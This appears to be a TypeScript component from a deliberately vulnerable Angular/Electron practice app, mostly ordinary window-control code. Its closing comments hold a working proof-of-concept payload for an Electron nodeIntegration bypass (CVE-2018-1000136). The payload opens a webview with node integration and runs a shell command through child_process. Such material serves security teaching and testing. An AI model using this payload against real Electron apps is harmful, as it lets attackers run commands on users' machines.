// Angular imports
import { Component } from '@angular/core';
import { BrowserWindow } from 'electron';
// App imports
import { ElectronUtilities } from 'app/shared/utilities/electron.util';
import { ElectronService } from 'app/shared/services/electron.service';

@Component({
  selector: 'vulnerable-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  ElectronUtilities: any = ElectronUtilities;

  constructor(public electronService: ElectronService) {}

  onClickMin(): void {
    this.electronService.remote.getCurrentWindow().minimize();
  }

  onClickMax(): void {
    this.electronService.remote.getCurrentWindow().maximize();
  }

  onClickRestore(): void {
    this.electronService.remote.getCurrentWindow().restore();
  }

  onClickClose(): void {
    this.electronService.remote.getCurrentWindow().close();
  }

  isMaximized(): boolean {
      return this.electronService.remote.getCurrentWindow().isMaximized();
  }
}

// var x = window.open('data://yoloswag','','webviewTag=yes,show=no');
// x.eval("var webview = new WebView;webview.setAttribute('webpreferences', 'webSecurity=no, nodeIntegration=yes');webview.src = `data:text/html;base64,PHNjcmlwdD5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnZGlyJywgZnVuY3Rpb24gKGUs cikgeyBhbGVydChyKTt9KTs8L3NjcmlwdD4K`;document.body.appendChild(webview)");
// <script>require('child_process').exec('dir', function (e,r) { alert(r);});</script>
// https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2018-1000136-electron-nodeintegration-bypass/
